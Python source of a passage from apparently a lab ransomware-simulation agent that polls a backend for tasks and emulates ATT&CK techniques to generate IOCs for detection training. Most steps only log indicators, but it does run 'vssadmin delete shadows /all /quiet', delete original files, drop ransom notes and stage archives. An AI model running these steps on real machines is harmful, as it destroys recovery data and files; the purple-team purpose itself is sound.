"""
RANSOMRUN Windows Agent - Advanced Scenario Engine
===================================================
This agent runs on Windows victim machines and:
1. Registers with the RANSOMRUN backend
2. Polls for tasks
3. Executes simulation scenarios based on JSON config
4. Collects forensic data (files, IOCs, metrics)
5. Reports detailed results back

IMPORTANT: This is for LAB/EDUCATIONAL use only!
Only run on isolated test machines.

SUPPORTED PLAYBOOKS & SCENARIOS:
================================

1. CRYPTO_BASIC - Basic file encryption simulation
   - File renaming with .locked extension
   - Ransom note creation
   - Basic MITRE T1486 (Data Encrypted for Impact)

2. CRYPTO_ADVANCED - Advanced ransomware with persistence
   - All CRYPTO_BASIC features
   - VSS deletion (T1490 - Inhibit System Recovery)
   - Persistence simulation (T1547 - Boot/Logon Autostart)
   - Network beacon (T1071 - Application Layer Protocol)

3. WIPER - Destructive wiper simulation
   - File quarantine (moves files instead of encrypting)
   - No ransom note (pure destruction)
   - VSS deletion
   - T1485 (Data Destruction)

4. EXFILTRATION - Data theft focused
   - File staging and compression
   - Simulated exfiltration preparation
   - T1560 (Archive Collected Data)
   - T1041 (Exfiltration Over C2 Channel)

5. LATERAL_MOVEMENT - Network propagation simulation
   - Network discovery (T1046)
   - Lateral movement tracers (T1021)
   - File drops in shared locations

6. CLOUD_ATTACK - Cloud storage targeting
   - Simulated S3/Azure blob attacks
   - Cloud file encryption (T1530, T1485)
   - Multi-cloud targeting

7. POLYMORPHIC - Evasion-focused attack
   - Hash mutation (T1027 - Obfuscated Files)
   - Code polymorphism simulation
   - Anti-analysis techniques

8. APT_FULL_CHAIN - Complete APT kill chain
   - All techniques combined
   - Persistence + Lateral + Exfil + Encryption
   - Maximum MITRE coverage

NEW PLAYBOOKS (Enhanced for SIEM Dashboard):
============================================

9. CREDENTIAL_DUMP - Credential access simulation
   - LSASS memory dump simulation (T1003.001)
   - SAM database access (T1003.002)
   - Credential file harvesting (T1552)

10. REGISTRY_PERSISTENCE - Registry manipulation
    - Run key persistence (T1547.001)
    - Service creation (T1543.003)
    - Scheduled task creation (T1053.005)

11. PROCESS_INJECTION - Code injection simulation
    - Process hollowing indicators (T1055.012)
    - DLL injection markers (T1055.001)
    - Reflective loading (T1620)

12. DEFENSE_EVASION - Anti-detection techniques
    - Timestomping simulation (T1070.006)
    - Log clearing (T1070.001)
    - Disable security tools (T1562.001)
"""


import os
import sys
import time
import json
import socket
import random
import shutil
import zipfile
import platform
import subprocess
import logging
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Any, Tuple, Optional, Union

try:
    import requests
except ImportError:
    print("ERROR: 'requests' library not installed.")
    print("Run: pip install requests")
    sys.exit(1)


# =============================================================================
# CONFIGURATION - MODIFY THESE VALUES
# =============================================================================

# Backend server URL (change to your server's IP)
# Can also be set via environment variable: RANSOMRUN_BACKEND_URL
# Example: set RANSOMRUN_BACKEND_URL=http://192.168.10.100:8000
# IMPORTANT: This IP must match where the RansomRun web server is running
# The agent creates firewall allow rules for this IP during isolation
BACKEND_URL = os.environ.get("RANSOMRUN_BACKEND_URL", "http://192.168.10.55:8000")

# Agent ID - leave empty to use hostname
AGENT_ID = os.environ.get("RANSOMRUN_AGENT_ID", "")

# Polling interval in seconds
POLL_INTERVAL = int(os.environ.get("RANSOMRUN_POLL_INTERVAL", "10"))

# Test directory for ransomware simulation
TEST_DIR = r"C:\RansomTest"

# Log file path
LOG_FILE = r"C:\RansomTest\agent.log"

# Quarantine directory for wiper simulation
QUARANTINE_DIR = r"C:\RansomTest\Quarantine"

# Exfil staging directory
EXFIL_STAGING_DIR = r"C:\RansomTest\ExfilStaging"


# =============================================================================
# LOGGING SETUP
# =============================================================================

def setup_logging():
    """Configure logging to file and console."""
    # Ensure log directory exists
    log_dir = os.path.dirname(LOG_FILE)
    if log_dir and not os.path.exists(log_dir):
        os.makedirs(log_dir, exist_ok=True)
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE, encoding='utf-8'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger("RansomRunAgent")


# =============================================================================
# AGENT CLASS
# =============================================================================

class RansomRunAgent:
    """RANSOMRUN Windows Agent."""
    
    def __init__(self, backend_url: str, agent_id: str = None):
        self.backend_url = backend_url.rstrip('/')
        self.hostname = platform.node()
        self.agent_id = agent_id or self.hostname
        self.ip_address = self._get_ip_address()
        self.logger = setup_logging()
        
        self.logger.info("=" * 50)
        self.logger.info("  RANSOMRUN Agent Starting")
        self.logger.info("=" * 50)
        self.logger.info(f"Hostname: {self.hostname}")
        self.logger.info(f"Agent ID: {self.agent_id}")
        self.logger.info(f"IP Address: {self.ip_address}")
        self.logger.info(f"Backend URL: {self.backend_url}")
        self.logger.info(f"Test Directory: {TEST_DIR}")
    
    def _get_ip_address(self) -> str:
        """Get the local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def register(self) -> bool:
        """Register or update agent with backend."""
        try:
            response = requests.post(
                f"{self.backend_url}/api/agent/register",
                json={
                    "agent_id": self.agent_id,
                    "hostname": self.hostname,
                    "ip_address": self.ip_address
                },
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.logger.info(f"Registered successfully. Host ID: {data.get('id')}")
                return True
            else:
                self.logger.error(f"Registration failed: {response.status_code} - {response.text}")
                return False
                
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Registration error: {e}")
            return False
    
    def poll_for_task(self) -> dict:
        """Poll backend for pending tasks."""
        try:
            response = requests.get(
                f"{self.backend_url}/api/agent/tasks",
                params={"agent_id": self.agent_id},
                timeout=10
            )
            
            if response.status_code == 200:
                return response.json()
            else:
                self.logger.warning(f"Task poll failed: {response.status_code}")
                return {"task_id": None}
                
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Task poll error: {e}")
            return {"task_id": None}
    
    def report_result(self, task_id: int, status: str, result_message: str):
        """Report task result back to backend."""
        try:
            response = requests.post(
                f"{self.backend_url}/api/agent/task-result",
                json={
                    "task_id": task_id,
                    "status": status,
                    "result_message": result_message
                },
                timeout=10
            )
            
            if response.status_code == 200:
                self.logger.info(f"Result reported for task {task_id}: {status}")
            else:
                self.logger.error(f"Result report failed: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Result report error: {e}")
    
    def execute_task(self, task: dict):
        """Execute a task based on its type."""
        task_id = task.get("task_id")
        task_type = task.get("type")
        parameters = task.get("parameters", {})
        
        self.logger.info(f"Executing task {task_id}: {task_type}")
        self.logger.info(f"Parameters: {parameters}")
        
        try:
            if task_type == "simulate_ransomware":
                result = self.simulate_ransomware(parameters)
            elif task_type == "stop_simulation":
                result = self.stop_simulation(parameters)
            elif task_type == "response_kill_process":
                result = self.response_kill_process(parameters)
            elif task_type == "response_disable_user":
                result = self.response_disable_user(parameters)
            elif task_type == "response_isolate_host":
                result = self.response_isolate_host(parameters)
            elif task_type == "response_reisolate_host":
                result = self.response_reisolate_host(parameters)
            elif task_type == "response_deisolate_host":
                result = self.response_deisolate_host(parameters)
            elif task_type == "recovery_enable_user":
                result = self.recovery_enable_user(parameters)
            elif task_type == "recovery_restore_files_from_quarantine":
                result = self.recovery_restore_files_from_quarantine(parameters)
            # NEW PLAYBOOK ACTIONS
            elif task_type == "backup_snapshot":
                result = self.backup_snapshot(parameters)
            elif task_type == "restore_backup":
                result = self.restore_backup(parameters)
            elif task_type == "isolate_host":
                result = self.isolate_host(parameters)
            elif task_type == "deisolate_host":
                result = self.deisolate_host(parameters)
            elif task_type == "protect_backup_targets":
                result = self.protect_backup_targets(parameters)
            elif task_type == "collect_triage":
                result = self.collect_triage(parameters)
            elif task_type == "block_ip":
                result = self.block_ip(parameters)
            # AUTOROLLBACK TASK HANDLERS
            elif task_type == "backup_create_snapshot":
                result = self.backup_create_snapshot(parameters)
            elif task_type == "rollback_restore_from_snapshot":
                result = self.rollback_restore_from_snapshot(parameters)
            elif task_type == "rollback_verify_hashes":
                result = self.rollback_verify_hashes(parameters)
            elif task_type == "rollback_cleanup_extensions":
                result = self.rollback_cleanup_extensions(parameters)
            elif task_type == "rollback_dry_run":
                result = self.rollback_dry_run(parameters)
            # CONTAINMENT TASK HANDLERS
            elif task_type == "containment_isolate_host":
                result = self.containment_isolate_host(parameters)
            elif task_type == "containment_restore_network":
                result = self.containment_restore_network(parameters)
            elif task_type == "containment_block_path":
                result = self.containment_block_path(parameters)
            elif task_type == "containment_quarantine_file":
                result = self.containment_quarantine_file(parameters)
            # SENSOR TASK HANDLERS (Blue Team Detection)
            elif task_type == "start_entropy_monitor":
                result = self.start_entropy_monitor(parameters)
            elif task_type == "start_honeyfile_monitor":
                result = self.start_honeyfile_monitor(parameters)
            elif task_type == "run_detection_sensors":
                result = self.run_detection_sensors(parameters)
            # SOAR TASK HANDLERS (Robust Isolation/Restore)
            elif task_type == "soar_isolate_host":
                result = self.soar_isolate_host(parameters)
            elif task_type == "soar_restore_network":
                result = self.soar_restore_network(parameters)
            # BACKUP & RESTORE TASK HANDLERS (LAB-SAFE)
            elif task_type == "backup_create":
                result = self.backup_create(parameters)
            elif task_type == "backup_restore":
                result = self.backup_restore(parameters)
            else:
                result = (False, f"Unknown task type: {task_type}")
            
            status = "completed" if result[0] else "failed"
            self.report_result(task_id, status, result[1])
            
        except Exception as e:
            self.logger.exception(f"Task execution error: {e}")
            self.report_result(task_id, "failed", str(e))
    
    # =========================================================================
    # SIMULATION ACTIONS - ADVANCED SCENARIO ENGINE
    # =========================================================================
    
    def simulate_ransomware(self, parameters: dict) -> tuple:
        """
        Execute ransomware simulation based on scenario config.
        
        The scenario config (JSON) defines:
        - directories_to_target
        - file_extensions
        - rename_pattern
        - ransom_note settings
        - simulate_vssadmin, simulate_persistence, simulate_exfiltration
        - intensity_level
        - optional_delay_seconds
        """
        scenario_key = parameters.get("scenario_key", "crypto_basic")
        scenario_config = parameters.get("scenario_config", {})
        run_id = parameters.get("run_id")
        
        self.logger.info(f"Running scenario: {scenario_key}")
        self.logger.info(f"Config: {json.dumps(scenario_config, indent=2)}")
        
        # Initialize forensic collectors
        self.affected_files: List[Dict] = []
        self.iocs: List[Dict] = []
        self.events: List[Dict] = []
        self.metrics: Dict[str, float] = {}
        
        start_time = datetime.utcnow()
        results = []
        
        try:
            # Launch GUI ransomware popup for high-impact scenarios
            gui_enabled = scenario_config.get("enable_gui_popup", False)
            polymorphic_mode = scenario_config.get("polymorphic_mode", False)
            
            if gui_enabled or scenario_key in ["advanced_polymorphic", "lockbit_sim", "conti_sim", "blackcat_sim"]:
                if polymorphic_mode or scenario_key == "advanced_polymorphic":
                    self.logger.info("Launching polymorphic ransomware with builder...")
                    self._launch_polymorphic_ransomware()
                    results.append("Polymorphic ransomware payload built and launched")
                else:
                    self.logger.info("Launching GUI ransomware popup...")
                    self._launch_gui_ransomware()
                    results.append("GUI ransomware popup launched")
            # Apply optional delay (dwell time simulation)
            delay = scenario_config.get("optional_delay_seconds", 0)
            if delay > 0:
                self.logger.info(f"Simulating dwell time: {delay}s delay")
                self._add_event("DWELL_TIME", {"delay_seconds": delay})
                time.sleep(delay)
            
            # Get target directories
            directories = scenario_config.get("directories_to_target", [TEST_DIR])
            if not directories:
                directories = [TEST_DIR]
            
            # Ensure directories exist and create sample files
            for dir_path in directories:
                self._ensure_test_directory(dir_path)
            
            results.append(f"Prepared {len(directories)} target directories")
            
            # Get file extensions to target
            extensions = scenario_config.get("file_extensions", [".txt", ".docx", ".xlsx"])
            rename_pattern = scenario_config.get("rename_pattern", ".locked")
            intensity = scenario_config.get("intensity_level", 2)
            quarantine_mode = scenario_config.get("quarantine_mode", False)
            
            # Stage 1: Persistence (if enabled)
            if scenario_config.get("simulate_persistence", False):
                self._simulate_persistence()
                results.append("Persistence mechanism simulated")
            
            # Stage 2: File operations (rename/quarantine)
            if rename_pattern and extensions:
                file_count = self._process_files(
                    directories, extensions, rename_pattern, 
                    intensity, quarantine_mode
                )
                action = "quarantined" if quarantine_mode else "encrypted"
                results.append(f"{action} {file_count} files")
                self.metrics["files_touched"] = file_count
            else:
                self.metrics["files_touched"] = 0
                results.append("No file operations (scenario config)")
            
            # Stage 3: Ransom note creation
            ransom_config = scenario_config.get("ransom_note", {})
            if ransom_config:
                note_count = self._create_ransom_notes(directories, ransom_config)
                results.append(f"Created {note_count} ransom notes")
            
            # Stage 4: Shadow copy deletion
            if scenario_config.get("simulate_vssadmin", False):
                vss_result = self._delete_shadow_copies()
                results.append(vss_result)
            
            # Stage 5: Exfiltration preparation
            if scenario_config.get("simulate_exfiltration", False):
                exfil_result = self._simulate_exfiltration(directories, extensions)
                results.append(exfil_result)
            
            # Stage 6: Network beacon simulation
            if scenario_config.get("simulate_network_beacon", False):
                self._simulate_network_beacon()
                results.append("Network beacon simulated")
            
            # Stage 7: Lateral movement simulation (Advanced)
            if scenario_config.get("simulate_lateral_movement", False):
                lateral_result = self._simulate_lateral_movement()
                results.append(lateral_result)
            
            # Stage 8: Cloud attack simulation (Advanced)
            if scenario_config.get("simulate_cloud_attack", False):
                cloud_result = self._simulate_cloud_attack()
                results.append(cloud_result)
            
            # Stage 9: Polymorphic mode logging (Advanced)
            if scenario_config.get("polymorphic_mode", False):
                self._log_polymorphic_activity()
                results.append("Polymorphic evasion simulated")
            
            # Stage 10: Credential dumping simulation (NEW)
            if scenario_config.get("simulate_credential_dump", False):
                cred_result = self._simulate_credential_dump()
                results.append(cred_result)
            
            # Stage 11: Registry persistence (NEW)
            if scenario_config.get("simulate_registry_persistence", False):
                reg_result = self._simulate_registry_persistence()
                results.append(reg_result)
            
            # Stage 12: Process injection (NEW)
            if scenario_config.get("simulate_process_injection", False):
                proc_result = self._simulate_process_injection()
                results.append(proc_result)
            
            # Stage 13: Defense evasion (NEW)
            if scenario_config.get("simulate_defense_evasion", False):
                evasion_result = self._simulate_defense_evasion()
                results.append(evasion_result)
            
            # Calculate metrics
            end_time = datetime.utcnow()
            duration_ms = (end_time - start_time).total_seconds() * 1000
            self.metrics["execution_time_ms"] = duration_ms
            self.metrics["alerts_expected"] = self._count_expected_alerts(scenario_config)
            
            summary = "; ".join(results)
            self.logger.info(f"Simulation complete: {summary}")
            
            # Report extended results
            self._report_extended_results(run_id)
            
            # Report ransomware artifacts for containment
            self._report_ransomware_artifacts(run_id, scenario_config, directories)
            
            return (True, summary)
            
        except Exception as e:
            self.logger.exception("Simulation error")
            return (False, str(e))
    
    def stop_simulation(self, parameters: dict) -> tuple:
        """
        Stop a running simulation.
        
        This is called when the backend sends a stop_simulation task.
        The agent should gracefully halt any ongoing simulation.
        """
        run_id = parameters.get("run_id")
        
        self.logger.warning(f"STOP SIMULATION requested for run_id: {run_id}")
        
        try:
            # Set a stop flag (if we had a running simulation loop, we'd check this)
            # For our current implementation, simulations are atomic tasks that complete quickly
            # So we just acknowledge the stop request
            
            # Log the stop event
            self.logger.info(f"Simulation stop acknowledged for run {run_id}")
            
            # If there were any cleanup actions needed, do them here
            # For example: close open files, release resources, etc.
            
            return (True, f"Simulation stopped successfully for run {run_id}")
            
        except Exception as e:
            self.logger.exception("Stop simulation error")
            return (False, f"Failed to stop simulation: {e}")
    
    def _ensure_test_directory(self, dir_path: str):
        """Ensure test directory exists with sample files."""
        path = Path(dir_path)
        path.mkdir(parents=True, exist_ok=True)
        
        # Create sample files if directory is empty or has few files
        existing_files = list(path.glob("*.*"))
        if len(existing_files) < 5:
            sample_files = [
                ("document1.docx", "Important business document content."),
                ("document2.docx", "Confidential project proposal."),
                ("spreadsheet.xlsx", "Financial data and projections."),
                ("presentation.pptx", "Quarterly review slides."),
                ("notes.txt", "Meeting notes and action items."),
                ("data.csv", "id,name,value\n1,item1,100\n2,item2,200"),
                ("report.pdf", "Annual report summary."),
                ("config.json", '{"setting": "value"}'),
                ("backup.xml", "<data><item>backup</item></data>"),
            ]
            
            for filename, content in sample_files:
                filepath = path / filename
                if not filepath.exists():
                    filepath.write_text(content)
                    self.logger.info(f"Created sample: {filepath}")
    
    def _process_files(
        self, 
        directories: List[str], 
        extensions: List[str], 
        rename_pattern: str,
        intensity: int,
        quarantine_mode: bool
    ) -> int:
        """Process files according to scenario config."""
        processed = 0
        max_files = intensity * 50  # intensity 1=50, 2=100, 3=150, etc.
        
        for dir_path in directories:
            path = Path(dir_path)
            if not path.exists():
                continue
            
            # Get matching files
            files = []
            for ext in extensions:
                files.extend(path.glob(f"*{ext}"))
            
            # Limit based on intensity
            if len(files) > max_files:
                files = random.sample(files, max_files)
            
            for filepath in files:
                if processed >= max_files:
                    break
                
                # Skip special files
                if filepath.name in ["agent.log", "README_RESTORE.txt"]:
                    continue
                if rename_pattern and filepath.name.endswith(rename_pattern):
                    continue
                
                try:
                    if quarantine_mode:
                        # Move to quarantine
                        quarantine_path = Path(QUARANTINE_DIR)
                        quarantine_path.mkdir(parents=True, exist_ok=True)
                        new_path = quarantine_path / filepath.name
                        shutil.move(str(filepath), str(new_path))
                        action_type = "QUARANTINED"
                    else:
                        # Copy file with ransomware extension (triggers Sysmon Event ID 11)
                        # This creates a new file which Sysmon will detect
                        new_path = filepath.with_suffix(filepath.suffix + rename_pattern)
                        shutil.copy2(str(filepath), str(new_path))
                        # Delete original to simulate encryption
                        filepath.unlink()
                        action_type = "ENCRYPTED"
                    
                    self.affected_files.append({
                        "original_path": str(filepath),
                        "new_path": str(new_path),
                        "action_type": action_type
                    })
                    
                    self.iocs.append({
                        "ioc_type": "FILE_PATH",
                        "value": str(new_path),
                        "context": f"ransomware_{action_type.lower()}"
                    })
                    
                    processed += 1
                    self.logger.info(f"{action_type}: {filepath.name}")
                    
                except Exception as e:
                    self.logger.warning(f"Failed to process {filepath}: {e}")
        
        self._add_event("FILES_PROCESSED", {"count": processed, "action": "quarantine" if quarantine_mode else "rename"})
        return processed
    
    def _create_ransom_notes(self, directories: List[str], ransom_config: dict) -> int:
        """Create ransom notes in specified locations."""
        filename = ransom_config.get("filename", "README_RESTORE.txt")
        content = ransom_config.get("content", "Your files have been encrypted!")
        locations = ransom_config.get("locations", ["target_root"])
        
        created = 0
        
        for location in locations:
            paths_to_create = []
            
            if location == "target_root":
                # Use directories if available, otherwise use TEST_DIR
                if directories:
                    paths_to_create = [Path(d) for d in directories]
                else:
                    paths_to_create = [Path(TEST_DIR)]
            elif location == "desktop":
                # Get desktop path - try multiple common locations
                desktop = Path.home() / "Desktop"
                if not desktop.exists():
                    desktop = Path.home() / "OneDrive" / "Desktop"
                if not desktop.exists():
                    # Create in TEST_DIR as fallback
                    desktop = Path(TEST_DIR)
                desktop.mkdir(parents=True, exist_ok=True)
                paths_to_create = [desktop]
            else:
                # Treat as literal path
                paths_to_create = [Path(location)]
            
            for path in paths_to_create:
                try:
                    if path.exists():
                        note_path = path / filename
                        note_path.write_text(content)
                        created += 1
                        self.logger.info(f"Created ransom note: {note_path}")
                        
                        self.iocs.append({
                            "ioc_type": "FILE_PATH",
                            "value": str(note_path),
                            "context": "ransom_note"
                        })
                except Exception as e:
                    self.logger.warning(f"Failed to create note at {path}: {e}")
        
        self._add_event("RANSOM_NOTE_CREATED", {"count": created, "filename": filename})
        return created
    
    def _delete_shadow_copies(self) -> str:
        """Delete shadow copies using vssadmin."""
        self.logger.warning("Executing vssadmin shadow copy deletion")
        
        cmd = "vssadmin delete shadows /all /quiet"
        self.iocs.append({
            "ioc_type": "CMD_LINE",
            "value": cmd,
            "context": "shadow_copy_deletion"
        })
        
        try:
            result = subprocess.run(
                ["vssadmin", "delete", "shadows", "/all", "/quiet"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            self._add_event("VSSADMIN_EXECUTED", {
                "command": cmd,
                "return_code": result.returncode,
                "output": result.stdout[:500] if result.stdout else result.stderr[:500]
            })
            
            if result.returncode == 0:
                return "Shadow copies deleted"
            else:
                return f"vssadmin: {result.stderr or 'No shadows or access denied'}"
                
        except subprocess.TimeoutExpired:
            return "vssadmin timed out"
        except Exception as e:
            return f"vssadmin error: {e}"
    
    def _simulate_persistence(self):
        """Simulate persistence mechanism (registry key)."""
        self.logger.info("Simulating persistence mechanism")
        
        # Simulate registry persistence (don't actually create it)
        reg_key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
        reg_value = "RansomRunSim"
        
        self.iocs.append({
            "ioc_type": "REG_KEY",
            "value": f"{reg_key}\\{reg_value}",
            "context": "persistence_simulation"
        })
        
        self._add_event("PERSISTENCE_CREATED", {
            "type": "registry",
            "key": reg_key,
            "value": reg_value,
            "simulated": True
        })
        
        self.logger.info(f"Persistence simulated: {reg_key}\\{reg_value}")
    
    def _simulate_exfiltration(self, directories: List[str], extensions: List[str]) -> str:
        """Simulate data exfiltration preparation."""
        self.logger.info("Simulating exfiltration preparation")
        
        staging_path = Path(EXFIL_STAGING_DIR)
        staging_path.mkdir(parents=True, exist_ok=True)
        
        # Create a staging ZIP file
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        zip_path = staging_path / f"exfil_staging_{timestamp}.zip"
        
        files_staged = 0
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for dir_path in directories:
                    path = Path(dir_path)
                    if not path.exists():
                        continue
                    
                    for ext in extensions[:3]:  # Limit to first 3 extensions
                        for filepath in list(path.glob(f"*{ext}"))[:10]:  # Max 10 files per ext
                            try:
                                zf.write(filepath, filepath.name)
                                files_staged += 1
                            except:
                                pass
            
            zip_size = zip_path.stat().st_size
            
            self.iocs.append({
                "ioc_type": "FILE_PATH",
                "value": str(zip_path),
                "context": "exfil_staging_archive"
            })
            
            self._add_event("EXFIL_PREPARED", {
                "archive_path": str(zip_path),
                "files_count": files_staged,
                "size_bytes": zip_size
            })
            
            self.metrics["exfil_files_staged"] = files_staged
            self.metrics["exfil_archive_size"] = zip_size
            
            return f"Exfil staged: {files_staged} files ({zip_size} bytes)"
            
        except Exception as e:
            return f"Exfil staging error: {e}"
    
    def _simulate_network_beacon(self):
        """Simulate C2 network beacon (log only, no actual connection)."""
        self.logger.info("Simulating network beacon")
        
        beacon_targets = [
            "malware-c2.evil.local:443",
            "exfil-server.bad.local:8080"
        ]
        
        for target in beacon_targets:
            self.iocs.append({
                "ioc_type": "NETWORK",
                "value": target,
                "context": "c2_beacon_simulation"
            })
        
        self._add_event("NETWORK_BEACON", {
            "targets": beacon_targets,
            "simulated": True
        })
    
    def _simulate_lateral_movement(self) -> str:
        """
        Simulate lateral movement (T1021).
        Attempts to write tracer files to network-accessible locations.
        """
        self.logger.info("[MITRE ATT&CK] T1021: Simulating lateral movement")
        
        # Network discovery (T1046)
        hostname = socket.gethostname()
        try:
            ip_address = socket.gethostbyname(hostname)
        except:
            ip_address = "127.0.0.1"
        
        self._add_event("NETWORK_DISCOVERY", {
            "technique": "T1046",
            "hostname": hostname,
            "ip_address": ip_address
        })
        
        self.iocs.append({
            "ioc_type": "NETWORK",
            "value": f"{hostname}:{ip_address}",
            "context": "network_discovery"
        })
        
        # Attempt to write tracer files to simulate spread
        lateral_targets = [
            "C:\\Users\\Public",
            "C:\\Users\\Public\\Documents",
        ]
        
        success_count = 0
        for target in lateral_targets:
            try:
                target_path = Path(target)
                if target_path.exists():
                    tracer_file = target_path / "LATERAL_MOVEMENT_TRACER.txt"
                    tracer_file.write_text(
                        f"SIMULATION: Lateral movement tracer\n"
                        f"Source: {hostname} ({ip_address})\n"
                        f"Time: {datetime.utcnow().isoformat()}\n"
                        f"This file proves the ransomware could spread to this location.\n"
                    )
                    success_count += 1
                    
                    self.iocs.append({
                        "ioc_type": "FILE_PATH",
                        "value": str(tracer_file),
                        "context": "lateral_movement_tracer"
                    })
                    
                    self.logger.info(f"Lateral movement: wrote tracer to {target}")
            except Exception as e:
                self.logger.debug(f"Lateral movement blocked for {target}: {e}")
        
        self._add_event("LATERAL_MOVEMENT", {
            "technique": "T1021",
            "targets_attempted": len(lateral_targets),
            "targets_successful": success_count,
            "source_host": hostname
        })
        
        return f"Lateral movement: {success_count}/{len(lateral_targets)} targets reached"
    
    def _simulate_cloud_attack(self) -> str:
        """
        Simulate cloud storage attack (T1530, T1485).
        Mocks S3/cloud bucket operations without actual API calls.
        """
        self.logger.info("[MITRE ATT&CK] T1530: Simulating cloud storage attack")
        
        # Simulated cloud targets
        cloud_targets = [
            {"bucket": "company-backups-critical", "provider": "AWS S3"},
            {"bucket": "finance-data-2025", "provider": "AWS S3"},
            {"bucket": "customer-database", "provider": "Azure Blob"}
        ]
        
        # Simulated files in cloud
        cloud_files = [
            "database_dump.sql",
            "ceo_emails.zip", 
            "customer_list.csv",
            "financials_2025.xlsx",
            "employee_records.json"
        ]
        
        self._add_event("CLOUD_DISCOVERY", {
            "technique": "T1530",
            "buckets_found": len(cloud_targets),
            "files_found": len(cloud_files)
        })
        
        # Simulate encryption of cloud files
        encrypted_files = []
        for file in cloud_files:
            encrypted_name = f"{file}.enc"
            encrypted_files.append(encrypted_name)
            
            self.iocs.append({
                "ioc_type": "CLOUD_FILE",
                "value": f"s3://company-backups-critical/{encrypted_name}",
                "context": "cloud_encryption"
            })
            
            self.logger.info(f"Cloud attack: {file} -> {encrypted_name}")
            time.sleep(0.3)  # Simulate processing time
        
        self._add_event("CLOUD_ATTACK", {
            "technique": "T1485",
            "files_encrypted": len(encrypted_files),
            "files_deleted": len(cloud_files),
            "ransom_note_dropped": True,
            "simulated": True
        })
        
        # Log ransom note in cloud
        self.iocs.append({
            "ioc_type": "CLOUD_FILE",
            "value": "s3://company-backups-critical/RESTORE_INSTRUCTIONS.txt",
            "context": "cloud_ransom_note"
        })
        
        self.metrics["cloud_files_encrypted"] = len(encrypted_files)
        self.metrics["cloud_buckets_targeted"] = len(cloud_targets)
        
        return f"Cloud attack: {len(encrypted_files)} files encrypted across {len(cloud_targets)} buckets"
    
    def _log_polymorphic_activity(self):
        """
        Log polymorphic dropper activity (T1027).
        Simulates hash evasion through code mutation.
        """
        self.logger.info("[MITRE ATT&CK] T1027: Polymorphic payload generation")
        
        import hashlib
        import random
        import string
        
        # Generate random "junk code" to simulate polymorphism
        junk_var = ''.join(random.choices(string.ascii_lowercase, k=8))
        junk_value = random.randint(1000, 9999)
        
        # Simulate original and mutated hashes
        original_hash = hashlib.sha256(b"original_payload_content").hexdigest()[:16]
        mutated_hash = hashlib.sha256(f"mutated_{junk_var}_{junk_value}".encode()).hexdigest()[:16]
        
        self._add_event("POLYMORPHIC_MUTATION", {
            "technique": "T1027",
            "original_hash": original_hash,
            "mutated_hash": mutated_hash,
            "junk_variable": junk_var,
            "evasion_type": "hash_mutation"
        })
        
        self.iocs.append({
            "ioc_type": "HASH",
            "value": mutated_hash,
            "context": "polymorphic_payload_hash"
        })
        
        self.logger.info(f"Polymorphic mutation: {original_hash} -> {mutated_hash}")
    
    def _simulate_credential_dump(self) -> str:
        """
        Simulate credential dumping (T1003).
        Logs indicators of LSASS access and SAM database harvesting.
        """
        self.logger.warning("[MITRE ATT&CK] T1003: Credential Dumping Simulation")
        
        # Simulate LSASS memory dump (T1003.001)
        lsass_dump_path = Path(EXFIL_STAGING_DIR) / "lsass_dump.dmp"
        lsass_dump_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Create a dummy file to simulate dump
        try:
            lsass_dump_path.write_bytes(b"SIMULATED_LSASS_DUMP" * 100)
            
            self._add_event("LSASS_DUMP", {
                "technique": "T1003.001",
                "target_process": "lsass.exe",
                "dump_path": str(lsass_dump_path),
                "simulated": True
            })
            
            self.iocs.append({
                "ioc_type": "FILE_PATH",
                "value": str(lsass_dump_path),
                "context": "lsass_memory_dump"
            })
            
            self.logger.warning(f"LSASS dump simulated: {lsass_dump_path}")
        except Exception as e:
            self.logger.warning(f"LSASS dump simulation failed: {e}")
        
        # Simulate SAM database access (T1003.002)
        sam_paths = [
            r"C:\Windows\System32\config\SAM",
            r"C:\Windows\System32\config\SYSTEM",
            r"C:\Windows\System32\config\SECURITY"
        ]
        
        for sam_path in sam_paths:
            self.iocs.append({
                "ioc_type": "FILE_PATH",
                "value": sam_path,
                "context": "sam_database_access"
            })
        
        self._add_event("SAM_ACCESS", {
            "technique": "T1003.002",
            "files_accessed": sam_paths,
            "simulated": True
        })
        
        # Simulate credential file harvesting (T1552)
        cred_files = [
            "browser_passwords.txt",
            "wifi_credentials.txt",
            "saved_passwords.db"
        ]
        
        staging_path = Path(EXFIL_STAGING_DIR)
        for cred_file in cred_files:
            try:
                file_path = staging_path / cred_file
                file_path.write_text(f"SIMULATED CREDENTIALS: {cred_file}")
                
                self.iocs.append({
                    "ioc_type": "FILE_PATH",
                    "value": str(file_path),
                    "context": "credential_harvesting"
                })
            except:
                pass
        
        self._add_event("CREDENTIAL_HARVEST", {
            "technique": "T1552",
            "files_harvested": len(cred_files),
            "simulated": True
        })
        
        self.metrics["credentials_dumped"] = len(sam_paths) + len(cred_files)
        
        return f"Credential dump: LSASS + SAM + {len(cred_files)} credential files"
    
    def _simulate_registry_persistence(self) -> str:
        """
        Simulate registry-based persistence mechanisms (T1547).
        Logs registry modifications without actually creating them.
        """
        self.logger.warning("[MITRE ATT&CK] T1547: Registry Persistence Simulation")
        
        # Run key persistence (T1547.001)
        run_keys = [
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefender",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\SystemCheck"
        ]
        
        for reg_key in run_keys:
            self.iocs.append({
                "ioc_type": "REG_KEY",
                "value": reg_key,
                "context": "run_key_persistence"
            })
        
